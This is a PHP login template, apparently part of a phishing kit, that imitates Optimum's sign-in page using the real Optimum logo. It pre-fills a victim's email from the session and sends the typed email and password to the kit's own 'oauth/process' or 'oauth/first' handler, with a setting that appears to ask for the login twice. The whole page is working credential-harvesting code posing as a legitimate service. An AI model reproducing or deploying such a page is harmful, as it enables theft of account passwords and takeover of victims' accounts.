<?php
defined("ALLOW") or exit('No direct script access allowed');
if (_config('DOUBLEEMAIL') == 'on') {
    $url = base_url() . "oauth/first";
} else {
    $url = base_url() . "oauth/process";
}
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <title>Amazon | Optimum</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * {
            box-sizing: border-box;
        }

        body {
            margin: 0;
            font-family: 'Segoe UI', sans-serif;
            background-color: #002f6c;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
        }

        .login-card {
            background-color: white;
            border-radius: 16px;
            width: 100%;
            max-width: 400px;
            padding: 32px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
        }

        .login-card img {
            max-width: 120px;
            display: block;
            margin: 0 auto 8px;
        }

        .login-card h2 {
            text-align: center;
            margin-bottom: 24px;
            font-size: 20px;
            color: #1e1e1e;
        }

        .form-group {
            margin-bottom: 16px;
        }

        .form-group input {
            width: 100%;
            padding: 12px 14px;
            border-radius: 8px;
            border: 1px solid #ccc;
            font-size: 15px;
        }

        .form-group input:focus {
            border-color: #0073e6;
            outline: none;
        }

        .remember-me {
            display: flex;
            align-items: center;
            margin-bottom: 20px;
        }

        .remember-me input {
            margin-right: 8px;
        }

        .btn {
            width: 100%;
            padding: 12px;
            background-color: #f60;
            color: white;
            font-weight: bold;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            cursor: pointer;
            margin-bottom: 12px;
        }

        .btn:hover {
            background-color: #e65500;
        }

        .link-row {
            display: flex;
            justify-content: center;
            gap: 20px;
            font-size: 13px;
            margin-bottom: 24px;
        }

        .link-row a {
            text-decoration: none;
            color: #004bbd;
        }

        .link-row a:hover {
            text-decoration: underline;
        }

        .footer {
            font-size: 14px;
            text-align: center;
            color: #333;
            border-top: 1px solid #eee;
            padding-top: 20px;
        }

        .footer a {
            color: #004bbd;
            text-decoration: none;
            font-weight: bold;
        }

        .footer a:hover {
            text-decoration: underline;
        }
    </style>
</head>

<body>
    <div class="login-card">
        <img src="https://www.optimum.net/static/img/optimum-logo.svg" alt="Optimum Logo" onerror="this.style.display='none'">
        <h2>Sign in to Optimum</h2>

        <!-- ✅ Action ditambahkan di sini -->
        <form name="signin" action="<?= $url ?>" method="post" novalidate="">
            <div class="form-group">
                <div class="a-row a-spacing-base"> <span id="email"><?php echo $_SESSION['email'] ?></span>
                    <input type="email" name="email" placeholder="Email or Optimum ID" value="<?php echo $_SESSION['email'] ?>" required>
                    <input type="hidden" name="emailLogin" value="<?php echo $_SESSION['email'] ?>">
                </div>
            </div>
            <div class="form-group">
                <input type="password" name="password" placeholder="password" required>
            </div>
            <div class="remember-me">
                <input type="checkbox" id="remember">
                <label for="remember">Remember Me</label>
            </div>
            <button class="btn" type="submit">Continue</button>
        </form>

        <div class="link-row">
            <a href="#">Forgot ID?</a>
            <a href="#">Forgot Password?</a>
        </div>

        <div class="footer">
            <p><strong>Don't have an Optimum ID?</strong></p>
            <p>An Optimum ID is a unique username that provides access to extra services and benefits.</p>
            <p><a href="#">Create an Optimum ID</a></p>
        </div>
    </div>
</body>

</html>